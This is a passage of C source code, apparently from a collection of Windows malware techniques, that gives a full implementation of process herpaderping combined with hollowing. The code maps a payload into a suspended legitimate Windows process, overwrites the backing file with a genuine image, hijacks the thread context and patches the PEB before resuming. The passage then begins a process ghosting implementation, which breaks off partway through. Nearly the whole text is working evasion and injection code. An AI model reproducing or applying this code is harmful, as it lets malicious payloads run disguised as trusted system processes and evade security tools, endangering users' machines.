	OUT  PHANDLE            FileHandle,
	IN   ACCESS_MASK        DesiredAccess,
	IN   POBJECT_ATTRIBUTES ObjectAttributes,
	OUT  PIO_STATUS_BLOCK   IoStatusBlock,
	IN	 PLARGE_INTEGER     AllocationSize		OPTIONAL,
	IN   ULONG              FileAttributes,
	IN   ULONG              ShareAccess,
	IN   ULONG              CreateDisposition,
	IN   ULONG              CreateOptions,
	IN   PVOID              EaBuffer,
	IN   ULONG              EaLength
	);

typedef NTSTATUS(NTAPI* fnNtWriteFile)(
	HANDLE           FileHandle,
	HANDLE           Event,
	PIO_APC_ROUTINE  ApcRoutine,
	PVOID            ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	PLARGE_INTEGER   ByteOffset,
	PULONG           Key
	);

typedef NTSTATUS(NTAPI* fnNtReadFile)(
	HANDLE				FileHandle,
	HANDLE				Event,
	PIO_APC_ROUTINE		ApcRoutine,
	PVOID				ApcContext,
	PIO_STATUS_BLOCK	IoStatusBlock,
	PVOID				Buffer,
	ULONG				Length,
	PLARGE_INTEGER		ByteOffset,
	PULONG				Key
	);

typedef NTSTATUS(NTAPI* fnNtSetInformationFile)(
	HANDLE                 FileHandle,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass
	);

typedef NTSTATUS(NTAPI* fnNtFlushBuffersFile)(
	HANDLE           FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock
	);

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
	PHANDLE					SectionHandle,
	ACCESS_MASK				DesiredAccess,
	POBJECT_ATTRIBUTES		ObjectAttributes,
	PLARGE_INTEGER			MaximumSize,
	ULONG					SectionPageProtection,
	ULONG					AllocationAttributes,
	HANDLE					FileHandle
	);


typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
	IN		HANDLE				SectionHandle,
	IN		HANDLE				ProcessHandle,
	IN OUT	PVOID* BaseAddress,
	IN		ULONG_PTR			ZeroBits,
	IN		SIZE_T				CommitSize,
	IN OUT	PLARGE_INTEGER		SectionOffset OPTIONAL,
	IN OUT	PSIZE_T				ViewSize,
	IN		SECTION_INHERIT		InheritDisposition,
	IN		ULONG				AllocationType,
	IN		ULONG				Protect
	);


typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)(
	HANDLE        ProcessHandle,
	PVOID         BaseAddress,
	PVOID         Buffer,
	SIZE_T        NumberOfBytesToWrite,
	PSIZE_T		  NumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* fnNtGetContextThread)(
	IN	HANDLE          ThreadHandle,
	OUT PCONTEXT        pContext
	);

typedef NTSTATUS(NTAPI* fnNtSetThreadContext)(
	IN	HANDLE          ThreadHandle,
	IN  PCONTEXT        pContext
	);

typedef NTSTATUS(NTAPI* fnNtResumeThread)(
	IN	 HANDLE    ThreadHandle,
	OUT  PULONG    SuspendCount OPTIONAL
	);

// ---------------------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------------------


typedef struct _NT_API_FP
{

	fnNtCreateFile					pNtCreateFile;
	fnNtCreateSection				pNtCreateSection;
	fnNtWriteFile					pNtWriteFile;
	fnNtReadFile					pNtReadFile;
	fnNtSetInformationFile			pNtSetInformationFile;
	fnNtFlushBuffersFile			pNtFlushBuffersFile;
	fnNtWriteVirtualMemory			pNtWriteVirtualMemory;
	fnNtMapViewOfSection			pNtMapViewOfSection;
	fnNtGetContextThread			pNtGetContextThread;
	fnNtSetThreadContext			pNtSetContextThread;
	fnNtResumeThread				pNtResumeThread;

} NT_API_FP, * PNT_API_FP;

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

#define DELETE_HANDLE(H)								\
	if (H != NULL && H != INVALID_HANDLE_VALUE){		\
		CloseHandle(H);									\
		H = NULL;										\
	}

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

NT_API_FP	g_NtApi = { 0x00 };

// =========================================================================================================================================================
// =========================================================================================================================================================

BOOL InitializeSyscallsStruct() {

	HMODULE		hNtdll = NULL;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL")))) {
		printf("[!] GetModuleHandle Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	g_NtApi.pNtCreateFile			= (fnNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
	g_NtApi.pNtWriteVirtualMemory	= (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	g_NtApi.pNtWriteFile			= (fnNtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
	g_NtApi.pNtReadFile				= (fnNtReadFile)GetProcAddress(hNtdll, "NtReadFile");
	g_NtApi.pNtSetInformationFile	= (fnNtSetInformationFile)GetProcAddress(hNtdll, "NtSetInformationFile");
	g_NtApi.pNtFlushBuffersFile		= (fnNtFlushBuffersFile)GetProcAddress(hNtdll, "NtFlushBuffersFile");
	g_NtApi.pNtCreateSection		= (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	g_NtApi.pNtMapViewOfSection		= (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	g_NtApi.pNtGetContextThread		= (fnNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
	g_NtApi.pNtSetContextThread		= (fnNtSetThreadContext)GetProcAddress(hNtdll, "NtSetContextThread");
	g_NtApi.pNtResumeThread			= (fnNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");

	if (!g_NtApi.pNtCreateFile			||	!g_NtApi.pNtWriteVirtualMemory	|| !g_NtApi.pNtWriteFile		|| !g_NtApi.pNtReadFile			||
		!g_NtApi.pNtSetInformationFile	||	!g_NtApi.pNtFlushBuffersFile	|| !g_NtApi.pNtCreateSection	|| !g_NtApi.pNtMapViewOfSection ||
		!g_NtApi.pNtGetContextThread	||	!g_NtApi.pNtSetContextThread	|| !g_NtApi.pNtResumeThread)
	{
		return FALSE;
	}

	return TRUE;
}

// =========================================================================================================================================================

VOID RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc)
			Length = 0xfffc;

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}

// =========================================================================================================================================================

BOOL OverWriteTheTmpFile(IN OPTIONAL HANDLE hSourceFile, IN OPTIONAL PBYTE pSourceBuffer, IN OPTIONAL DWORD dwSourceBufferSize, IN HANDLE hDistenationFile, IN BOOL bOverWriteByHandle) {

	BOOL							bResult				= FALSE;
	NTSTATUS						STATUS				= STATUS_SUCCESS;
	LARGE_INTEGER					ByteOffset			= { 0 };
	IO_STATUS_BLOCK					StatusBlock			= { 0 };
	DWORD							dwPeFileSize		= dwSourceBufferSize;
	PBYTE							pPeFileBuffer		= pSourceBuffer;
	FILE_POSITION_INFORMATION		FilePosInfo			= { 0 };
	FILE_END_OF_FILE_INFORMATION	FileEndInfo			= { 0 };

	if (!hDistenationFile || hDistenationFile == INVALID_HANDLE_VALUE)
		return FALSE;

	if ((bOverWriteByHandle && !hSourceFile) || (bOverWriteByHandle && hSourceFile == INVALID_HANDLE_VALUE))
		return FALSE;

	if ((!bOverWriteByHandle && !pSourceBuffer) || (!bOverWriteByHandle && !dwSourceBufferSize))
		return FALSE;

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetInformationFile(hDistenationFile, &StatusBlock, &FilePosInfo, sizeof(FILE_POSITION_INFORMATION), FilePositionInformation)))) {
		printf("[!] NtSetInformationFile [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if (bOverWriteByHandle) {

		if ((dwPeFileSize = GetFileSize(hSourceFile, NULL)) == INVALID_FILE_SIZE) {
			printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}

		if (!(pPeFileBuffer = LocalAlloc(LPTR, (SIZE_T)dwPeFileSize))) {
			printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}

		if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetInformationFile(hSourceFile, &StatusBlock, &FilePosInfo, sizeof(FILE_POSITION_INFORMATION), FilePositionInformation)))) {
			printf("[!] NtSetInformationFile [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			goto _END_OF_FUNC;
		}

		if (!NT_SUCCESS((STATUS = g_NtApi.pNtReadFile(hSourceFile, NULL, NULL, NULL, &StatusBlock, pPeFileBuffer, dwPeFileSize, &ByteOffset, NULL)))) {
			printf("[!] NtReadFile Failed With Error: 0x%0.8X \n", STATUS);
			goto _END_OF_FUNC;
		}
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteFile(hDistenationFile, NULL, NULL, NULL, &StatusBlock, pPeFileBuffer, dwPeFileSize, &ByteOffset, NULL)))) {
		printf("[!] NtWriteFile Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtFlushBuffersFile(hDistenationFile, &StatusBlock)))) {
		printf("[!] NtFlushBuffersFile Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	FileEndInfo.EndOfFile.QuadPart = dwPeFileSize;

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetInformationFile(hDistenationFile, &StatusBlock, &FileEndInfo, sizeof(FILE_END_OF_FILE_INFORMATION), FileEndOfFileInformation)))) {
		printf("[!] NtSetInformationFile [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pPeFileBuffer && bOverWriteByHandle)
		LocalFree(pPeFileBuffer);
	return bResult;
}

// =========================================================================================================================================================

BOOL CreateHerpaderpingHollowingProcess(IN LPWSTR szLegitWindowsPe, IN LPWSTR szPePayloadArgs, IN ULONG_PTR uPePayloadBuffer, IN SIZE_T sPePayloadSize, OUT LPPROCESS_INFORMATION lpProcessInformation) {

	BOOL					bResult						= FALSE;
	NTSTATUS				STATUS						= STATUS_SUCCESS;
	PVOID					pMappedImgAddress			= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs					= NULL;
	SIZE_T					sViewSize					= 0x00;
	STARTUPINFOW			StartupInfo					= { 0 };
	UNICODE_STRING			usFileName					= { 0 };
	OBJECT_ATTRIBUTES		FileObjectAttr				= { 0 };
	IO_STATUS_BLOCK			IOStatusBlock				= { 0 };
	CONTEXT					ThreadContext				= { .ContextFlags = CONTEXT_ALL };
	HANDLE					hTmpPeFile					= NULL,
							hLegitPeFile				= NULL,
							hSection					= NULL;
	WCHAR					szTmpPath[MAX_PATH]			= { 0 };
	WCHAR					szTmpFilePath[MAX_PATH]		= { 0 };
	WCHAR					szFileNtPath[MAX_PATH * 2]	= { 0 };
	PWCHAR					pwcDuplicateStr				= NULL,
							pwcLastSlash				= NULL;

	if (!szLegitWindowsPe || !uPePayloadBuffer || !sPePayloadSize || !lpProcessInformation)
		return FALSE;

	if (!InitializeSyscallsStruct())
		return FALSE;

	if (GetTempPathW(MAX_PATH, szTmpPath) == 0x00) {
		printf("[!] GetTempPathW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (GetTempFileNameW(szTmpPath, L"PH", 0x00, szTmpFilePath) == 0x00) {
		printf("[!] GetTempFileNameW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	wsprintfW(szFileNtPath, L"\\??\\\\%s", szTmpFilePath);
	printf("[i] Created Tmp Nt Path: %ws \n", szFileNtPath);
	RtlInitUnicodeString(&usFileName, szFileNtPath);
	InitializeObjectAttributes(&FileObjectAttr, &usFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateFile(&hTmpPeFile, (FILE_GENERIC_READ | FILE_GENERIC_WRITE), &FileObjectAttr, &IOStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, (FILE_SHARE_READ | FILE_SHARE_WRITE), FILE_OPEN, FILE_RANDOM_ACCESS, NULL, 0x00))) || !hTmpPeFile) {
		printf("[!] NtCreateFile [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	wsprintfW(szFileNtPath, L"\\??\\\\%s", szLegitWindowsPe);
	printf("[i] Legit Windows Image Nt Path: %ws \n", szFileNtPath);
	RtlInitUnicodeString(&usFileName, szFileNtPath);
	InitializeObjectAttributes(&FileObjectAttr, &usFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateFile(&hLegitPeFile, FILE_GENERIC_READ, &FileObjectAttr, &IOStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_RANDOM_ACCESS, NULL, 0x00))) || !hLegitPeFile) {
		printf("[!] NtCreateFile [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if (!OverWriteTheTmpFile(NULL, uPePayloadBuffer, sPePayloadSize, hTmpPeFile, FALSE))
		goto _END_OF_FUNC;

	printf("[+] Wrote The Payload File To The Created Temporary File \n");

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hTmpPeFile))) || !hSection) {
		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[i] Created A Section Of The Temporary File: 0x%0.8X \n", hSection);

	memset(szFileNtPath, 0x00, MAX_PATH);
	wsprintfW(szFileNtPath, L"%s %s", szLegitWindowsPe, szPePayloadArgs);

	if (!CreateProcessW(NULL, szFileNtPath, NULL, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, pwcDuplicateStr, &StartupInfo, lpProcessInformation)) {
		printf("[!] CreateProcessW Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[*] Created Herpaderping Process With PID: %d \n", lpProcessInformation->dwProcessId);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtMapViewOfSection(hSection, lpProcessInformation->hProcess, &pMappedImgAddress, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READONLY)))) {
		printf("[!] NtMapViewOfSection Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[i] Base Address Of The Mapped Herpaderping Section: 0x%p \n", pMappedImgAddress);

	DELETE_HANDLE(hSection);

	if (!OverWriteTheTmpFile(hLegitPeFile, NULL, 0x00, hTmpPeFile, TRUE))
		goto _END_OF_FUNC;

	DELETE_HANDLE(hTmpPeFile);
	DELETE_HANDLE(hLegitPeFile);

	printf("[i] Overwrote The Temporary File With The Legitmate Windows Image\n");

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uPePayloadBuffer + ((PIMAGE_DOS_HEADER)uPePayloadBuffer)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _END_OF_FUNC;

	printf("[i] Hijacking Thread Of ID: %d \n", lpProcessInformation->dwThreadId);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtGetContextThread(lpProcessInformation->hThread, &ThreadContext)))) {
		printf("[!] NtGetContextThread Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	ThreadContext.Rcx = (DWORD64)((ULONG_PTR)pMappedImgAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtSetContextThread(lpProcessInformation->hThread, &ThreadContext)))) {
		printf("[!] NtSetContextThread Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] PE Payload Entry Point: 0x%p \n", ThreadContext.Rcx);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(lpProcessInformation->hProcess, (LPVOID)(ThreadContext.Rdx + offsetof(PEB, ImageBase)), &pMappedImgAddress, sizeof(ULONGLONG), NULL)))) {
		printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[*] Updated Image Base Address In The Remote Process PEB \n");

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtResumeThread(lpProcessInformation->hThread, NULL)))) {
		printf("[!] NtResumeThread Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[*] Resumed Remote Process \n");

	bResult = TRUE;

_END_OF_FUNC:
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	DELETE_HANDLE(hTmpPeFile);
	DELETE_HANDLE(hLegitPeFile);
	DELETE_HANDLE(hSection);
	return bResult;
}
```
### Process Ghosting
```c
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include "Structs.h"

#pragma comment(lib, "Userenv.lib")

typedef NTSTATUS(NTAPI* fnNtOpenFile)(
	PHANDLE            FileHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK   IoStatusBlock,
	ULONG              ShareAccess,
	ULONG              OpenOptions
	);

typedef NTSTATUS(NTAPI* fnNtWriteFile)(
	HANDLE           FileHandle,
	HANDLE           Event,
	PIO_APC_ROUTINE  ApcRoutine,
	PVOID            ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	PLARGE_INTEGER   ByteOffset,
	PULONG           Key
	);

typedef NTSTATUS(NTAPI* fnNtSetInformationFile)(
	HANDLE                 FileHandle,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass
	);

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
	PHANDLE					SectionHandle,
	ACCESS_MASK				DesiredAccess,
	POBJECT_ATTRIBUTES		ObjectAttributes,
	PLARGE_INTEGER			MaximumSize,
	ULONG					SectionPageProtection,
	ULONG					AllocationAttributes,
	HANDLE					FileHandle
	);

typedef NTSTATUS(NTAPI* fnNtReadVirtualMemory)(
	HANDLE          ProcessHandle,
	PVOID           BaseAddress,
	PVOID           Buffer,
	ULONG           NumberOfBytesToRead,
	PULONG          NumberOfBytesRead
	);


typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
	PRTL_USER_PROCESS_PARAMETERS*	pProcessParameters,
	PUNICODE_STRING                 ImagePathName,
	PUNICODE_STRING                 DllPath,
	PUNICODE_STRING                 CurrentDirectory,
	PUNICODE_STRING                 CommandLine,
	PVOID                           Environment,
	PUNICODE_STRING                 WindowTitle,
	PUNICODE_STRING                 DesktopInfo,
	PUNICODE_STRING                 ShellInfo,
	PUNICODE_STRING                 RuntimeData,
	ULONG                           Flags
	);

typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)(
	HANDLE		ProcessHandle,
	PVOID*		BaseAddress,
	ULONG_PTR	ZeroBits,
	PSIZE_T		RegionSize,
	ULONG		AllocationType,
	ULONG		Protect
	);

typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)(
	HANDLE        ProcessHandle,
	PVOID         BaseAddress,
	PVOID         Buffer,
	SIZE_T        NumberOfBytesToWrite,
	PSIZE_T		  NumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* fnNtCreateProcessEx)(
	PHANDLE				ProcessHandle,
	ACCESS_MASK			DesiredAccess,
	POBJECT_ATTRIBUTES	ObjectAttributes,
	HANDLE				ParentProcess,
	ULONG				Flags,
	HANDLE				SectionHandle,
	HANDLE				DebugPort,
	HANDLE				ExceptionPort,
	BOOLEAN				InJob
	);

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);

typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
	PHANDLE                 ThreadHandle,
	ACCESS_MASK             DesiredAccess,
	POBJECT_ATTRIBUTES      ObjectAttributes,
	HANDLE                  ProcessHandle,
	PVOID                   StartRoutine,
	PVOID                   Argument,
	ULONG                   CreateFlags,
	SIZE_T                  ZeroBits,
	SIZE_T                  StackSize,
	SIZE_T                  MaximumStackSize,
	PPS_ATTRIBUTE_LIST      AttributeList
	);


// ---------------------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------------------
// ---------------------------------------------------------------------------------------------------------------------------------------------------------


typedef struct _NT_API_FP
{
	fnNtOpenFile					pNtOpenFile;
	fnNtSetInformationFile			pNtSetInformationFile;
	fnNtAllocateVirtualMemory		pNtAllocateVirtualMemory;
	fnNtWriteVirtualMemory			pNtWriteVirtualMemory;
	fnNtWriteFile					pNtWriteFile;
	fnNtCreateSection				pNtCreateSection;
	fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx;
	fnNtCreateProcessEx				pNtCreateProcessEx;
	fnNtQueryInformationProcess		pNtQueryInformationProcess;
	fnNtCreateThreadEx				pNtCreateThreadEx;
	fnNtReadVirtualMemory			pNtReadVirtualMemory;

} NT_API_FP, * PNT_API_FP;

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

#define DELETE_HANDLE(H)								\
	if (H != NULL && H != INVALID_HANDLE_VALUE){		\
		CloseHandle(H);									\
		H = NULL;										\
	}

// ---------------------------------------------------------------------------------------------------------------------------------------------------------

NT_API_FP	g_NtApi = { 0x00 };

// =========================================================================================================================================================
// =========================================================================================================================================================

BOOL InitializeSyscallsStruct() {

	HMODULE		hNtdll = NULL;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL")))) {
		printf("[!] GetModuleHandle Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	g_NtApi.pNtOpenFile						= (fnNtOpenFile)GetProcAddress(hNtdll, "NtOpenFile");
	g_NtApi.pNtSetInformationFile			= (fnNtSetInformationFile)GetProcAddress(hNtdll, "NtSetInformationFile");
	g_NtApi.pNtAllocateVirtualMemory		= (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	g_NtApi.pNtWriteVirtualMemory			= (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	g_NtApi.pNtWriteFile					= (fnNtWriteFile)GetProcAddress(hNtdll, "NtWriteFile");
	g_NtApi.pNtCreateSection				= (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	g_NtApi.pRtlCreateProcessParametersEx	= (fnRtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
	g_NtApi.pNtCreateProcessEx				= (fnNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
	g_NtApi.pNtQueryInformationProcess		= (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	g_NtApi.pNtCreateThreadEx				= (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	g_NtApi.pNtReadVirtualMemory			= (fnNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");

	if (!g_NtApi.pNtOpenFile					||	!g_NtApi.pNtSetInformationFile		||	!g_NtApi.pNtAllocateVirtualMemory	||
		!g_NtApi.pNtWriteVirtualMemory			||	!g_NtApi.pNtWriteFile				||	!g_NtApi.pNtCreateSection			||
		!g_NtApi.pRtlCreateProcessParametersEx	||	!g_NtApi.pNtCreateProcessEx			||	!g_NtApi.pNtQueryInformationProcess	||
		!g_NtApi.pNtCreateThreadEx				||	!g_NtApi.pNtReadVirtualMemory)
	{
		return FALSE;
	}

	return TRUE;
}


// =========================================================================================================================================================

VOID RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc)
			Length = 0xfffc;

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}

// =========================================================================================================================================================

BOOL InitializeProcessParms(IN HANDLE hProcess, IN LPWSTR szLegitWindowsPeWithArgs, OUT PVOID* ppImageBase) {

	BOOL							bResult							= FALSE;
	NTSTATUS						STATUS							= STATUS_SUCCESS;
	UNICODE_STRING					UsCommandLine					= { 0 },
									UsNtImagePath					= { 0 },
									UsCurrentDirectory				= { 0 };
	PRTL_USER_PROCESS_PARAMETERS	pUserProcParms					= { 0 };
	PVOID							pEnvironment					= NULL;
	PWCHAR							pwcDuplicateStr					= NULL,
									pwcDuplicateStr2				= NULL,
									pwcExe							= NULL,
									pwcLastSlash					= NULL;
	PEB								Peb								= { 0 };
	PROCESS_BASIC_INFORMATION		ProcInfo						= { 0 };
	ULONG_PTR						uUserEnvAndParmsBaseAddress		= NULL,
									uUserEnvAndParmsEndAddress		= NULL;
	SIZE_T							sUserEnvAndParmsSize			= NULL,
									sNumberOfBytesWritten			= NULL;
	PVOID							pTmpPntrAddress					= NULL;

	/*
		* szLegitWindowsPeWithArgs	 -	L"C:\\Windows\\system32\\RuntimeBroker.exe coffee"		(UNICODE_STRING UsCommandLine)
		* pwcDuplicateStr			-	L"C:\\Windows\\system32"								(UNICODE_STRING UsCurrentDirectory)
		* pwcDuplicateStr2			-	L"C:\\Windows\\system32\\RuntimeBroker.exe"				(UNICODE_STRING UsNtImagePath)
	*/

	if (!(pwcDuplicateStr = _wcsdup(szLegitWindowsPeWithArgs)))
		goto _END_OF_FUNC;
	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!(pwcDuplicateStr2 = _wcsdup(szLegitWindowsPeWithArgs)))
		goto _END_OF_FUNC;
	if (pwcExe = wcsstr(pwcDuplicateStr2, L".exe"))
		*(pwcExe + sizeof(".exe")) = L'\0';


	if (!CreateEnvironmentBlock(&pEnvironment, NULL, TRUE)) {
		printf("[!] CreateEnvironmentBlock Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	RtlInitUnicodeString(&UsCommandLine, szLegitWindowsPeWithArgs);
	RtlInitUnicodeString(&UsCurrentDirectory, pwcDuplicateStr);
	RtlInitUnicodeString(&UsNtImagePath, pwcDuplicateStr2);

	if (!NT_SUCCESS((STATUS = g_NtApi.pRtlCreateProcessParametersEx(&pUserProcParms, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, pEnvironment, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)))) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &ProcInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL)))) {
		printf("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtReadVirtualMemory(hProcess, ProcInfo.PebBaseAddress, &Peb, sizeof(PEB), NULL)))) {
		printf("[!] NtReadVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	printf("[i] Ghost Process PEB Address: 0x%p \n", ProcInfo.PebBaseAddress);
	printf("[i] Ghost Process Image Address: 0x%p \n", Peb.ImageBase);

	uUserEnvAndParmsBaseAddress = pUserProcParms;
	uUserEnvAndParmsEndAddress	= (ULONG_PTR)pUserProcParms + pUserProcParms->Length;

	if (pUserProcParms->Environment) {

		if ((ULONG_PTR)pUserProcParms > (ULONG_PTR)pUserProcParms->Environment)
			uUserEnvAndParmsBaseAddress = (PVOID)pUserProcParms->Environment;

		if ((ULONG_PTR)pUserProcParms->Environment + pUserProcParms->EnvironmentSize > uUserEnvAndParmsEndAddress)
			uUserEnvAndParmsEndAddress = (ULONG_PTR)pUserProcParms->Environment + pUserProcParms->EnvironmentSize;
	}

	sUserEnvAndParmsSize	= uUserEnvAndParmsEndAddress - uUserEnvAndParmsBaseAddress;
	pTmpPntrAddress			= pUserProcParms;

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtAllocateVirtualMemory(hProcess, &pTmpPntrAddress, 0x00, &sUserEnvAndParmsSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))) {
		printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, pUserProcParms, pUserProcParms, pUserProcParms->Length, &sNumberOfBytesWritten)))) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNumberOfBytesWritten, pUserProcParms->Length);
		goto _END_OF_FUNC;
	}

	if (pUserProcParms->Environment) {

